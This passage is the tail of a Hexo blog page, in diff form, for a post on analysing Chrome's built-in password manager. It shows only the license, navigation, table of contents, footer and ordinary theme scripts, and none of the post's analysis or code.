+            <strong>Link:</strong> https://blog.komiya.monster/2023/12/25/chrome_passwd_leak/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Tech/">#Tech</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/12/31/2023AS/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">2023年度总结</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/11/30/%E6%9C%88%E6%8A%A5%EF%BC%9A%E6%96%B0%E7%AB%B9%E7%9A%84%E5%8D%81%E4%B8%80%E6%9C%88/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">月报：新竹的十一月</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Browser-bulid-in passwd manager analysis</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="nav-text">实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Dependence"><span class="nav-text">Dependence</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Code"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A3%9F%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">食用方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Aoi Komiya</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.5</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2023/3/17 22:11:12
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <div class="customize-info info-item">私の好きな人よ,永遠に私に会わないで欲しいです</div>
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
